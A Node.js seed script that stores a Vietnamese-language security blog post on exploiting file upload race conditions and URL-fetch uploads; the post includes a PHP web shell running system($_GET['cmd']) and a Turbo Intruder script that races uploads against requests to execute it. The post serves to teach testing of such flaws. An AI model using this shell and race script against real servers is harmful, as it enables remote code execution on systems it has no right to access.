import mongoose from "mongoose";
import dotenv from "dotenv";
import path from "path";

// Load env vars
dotenv.config({ path: path.resolve(process.cwd(), ".env.local") });

// Define Post Schema inline (same as in seed.ts)
const PostSchema = new mongoose.Schema(
  {
    title: { type: String, required: true },
    slug: { type: String, required: true, unique: true },
    excerpt: { type: String },
    contentMDX: { type: String, required: true },
    type: {
      type: String,
      enum: ["CVE", "POC", "WRITEUP", "ADVISORY"],
      required: true,
    },
    cveId: { type: String },
    cwe: { type: String },
    cvssScore: { type: Number, min: 0, max: 10 },
    severity: { type: String, enum: ["Critical", "High", "Medium", "Low"] },
    vendor: { type: String },
    product: { type: String },
    affectedVersions: { type: [String] },
    fixedVersions: { type: [String] },
    references: { type: [String] },
    githubPocUrl: { type: String },
    tags: { type: [String] },
    status: {
      type: String,
      enum: ["draft", "published", "scheduled"],
      default: "draft",
    },
    publishedAt: { type: Date },
    scheduledAt: { type: Date },
    views: { type: Number, default: 0 },
  },
  { timestamps: true }
);

const Post = mongoose.models.Post || mongoose.model("Post", PostSchema);

async function seedFileUpload() {
  const MONGODB_URI = process.env.MONGODB_URI;
  if (!MONGODB_URI) {
    console.error("MONGODB_URI is not defined");
    process.exit(1);
  }

  try {
    await mongoose.connect(MONGODB_URI);
    console.log("Connected to MongoDB");

    const post = {
      title: "Advanced File Upload Exploitation: Race Conditions",
      slug: "advanced-file-upload-exploitation-race-conditions",
      excerpt:
        "Detailed guide on exploiting file upload vulnerabilities using Race Conditions and HTTP PUT methods.",
      contentMDX: `
# Exploiting File Upload (Khai thác lỗ hổng tải lên tệp nâng cao)

Tài liệu này cung cấp hướng dẫn chi tiết về các kỹ thuật khai thác lỗ hổng tải lên tệp nâng cao, tập trung vào các lỗi logic trong quy trình xử lý của máy chủ như **Race Conditions** (Điều kiện tranh chấp) và cấu hình sai **HTTP PUT**.

---

## 1. Race Conditions (Điều kiện tranh chấp)

### Cơ chế hoạt động (Tại sao lỗi này tồn tại?)
Lỗ hổng này xảy ra khi ứng dụng thực hiện việc **lưu tệp trước** rồi mới **kiểm tra xác thực sau**. Đây là lỗi logic dạng "Time of Check to Time of Use" (TOCTOU).

**Quy trình xử lý không an toàn:**
1.  **Upload**: Người dùng gửi file \`shell.php\`.
2.  **Save**: Server lưu file vào thư mục gốc (ví dụ: \`/uploads/shell.php\`).
3.  **Validate**: Server chạy trình quét virus hoặc kiểm tra định dạng ảnh.
4.  **Delete**: Nếu file không hợp lệ, server xóa file \`shell.php\`.

**Vấn đề**: Giữa bước 2 (Lưu) và bước 4 (Xóa) tồn tại một khoảng thời gian nhỏ (vài mili giây đến vài giây). Trong "cửa sổ thời gian" (race window) này, file \`shell.php\` thực sự tồn tại trên server và có thể truy cập được.

### Kịch bản khai thác chi tiết

Để khai thác, bạn cần thực hiện tấn công "Brute-force" về mặt thời gian: gửi yêu cầu thực thi file ngay khi nó vừa được tải lên nhưng chưa kịp bị xóa.

#### Bước 1: Chuẩn bị Payload
Tạo file \`shell.php\` với nội dung đơn giản để xác nhận mã đã chạy:
\`\`\`php
<?php echo "VULNERABLE: " . system($_GET['cmd']); ?>
\`\`\`

#### Bước 2: Sử dụng Turbo Intruder (Burp Suite)
Đây là cách hiệu quả nhất vì Turbo Intruder có thể gửi request cực nhanh.

1.  Gửi request **POST /upload** tới Turbo Intruder.
2.  Sử dụng script Python sau trong Turbo Intruder:

\`\`\`python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # Tạo 2 loại request: 1 là upload, 2 là get file
    request1 = '''POST /upload HTTP/1.1
Host: vulnerable-website.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
...
Content-Disposition: form-data; name="avatar"; filename="shell.php"

<?php echo system($_GET['cmd']); ?>
------WebKitFormBoundary--
'''

    request2 = '''GET /uploads/shell.php?cmd=whoami HTTP/1.1
Host: vulnerable-website.com
'''

    # Gửi xen kẽ liên tục
    for i in range(1000):
        engine.queue(request1) # Upload
        for x in range(5):
            engine.queue(request2) # Cố gắng truy cập ngay lập tức

def handleResponse(req, interesting):
    # Nếu server trả về 200 OK cho request GET, nghĩa là ta đã thắng race condition
    if req.status == 200 and "VULNERABLE" in req.response:
        table.add(req)
\`\`\`

#### Bước 3: Phân tích kết quả
*   Nếu bạn thấy một response \`200 OK\` từ request \`GET\` có chứa output của lệnh \`whoami\`, bạn đã khai thác thành công.

---

## 2. URL-based File Upload Race Conditions

### Cơ chế hoạt động
Thay vì upload file từ máy tính, người dùng cung cấp một URL để server tự tải về (tính năng "Fetch from URL").

**Quy trình:**
1.  Server nhận URL từ người dùng.
2.  Server tải file từ URL đó về một thư mục tạm (thường có tên ngẫu nhiên).
3.  Server kiểm tra file.
4.  Nếu hợp lệ -> Di chuyển sang thư mục chính. Nếu không -> Xóa.

**Lỗ hổng**: Nếu kẻ tấn công có thể đoán được tên thư mục tạm hoặc tên file tạm thời, họ có thể truy cập file trong khi server đang tải nó về hoặc đang xử lý nó.

### Kỹ thuật khai thác

1.  **Kéo dài thời gian xử lý**:
    *   Tạo một file payload rất nặng (ví dụ: 10MB) nhưng chứa mã độc PHP ở ngay đầu file.
    *   Việc tải file lớn sẽ làm tăng "race window", cho bạn nhiều thời gian hơn để đoán tên file.

2.  **Đoán tên file tạm (Brute-force)**:
    *   Nếu server dùng hàm tạo tên ngẫu nhiên yếu (như \`uniqid()\` của PHP hoặc timestamp), bạn có thể brute-force tên file.
      `,
      type: "WRITEUP",
      tags: ["FileUpload", "RaceCondition", "WebSecurity", "Advanced"],
      status: "published",
      publishedAt: new Date(),
      views: 0,
    };

    // Check if post exists
    const existingPost = await Post.findOne({ slug: post.slug });
    if (existingPost) {
      console.log("Post already exists, updating...");
      await Post.updateOne({ slug: post.slug }, post);
    } else {
      await Post.create(post);
      console.log("Post created successfully");
    }

    console.log("Seeding completed");
    process.exit(0);
  } catch (error) {
    console.error("Seeding failed:", error);
    process.exit(1);
  }
}

seedFileUpload();
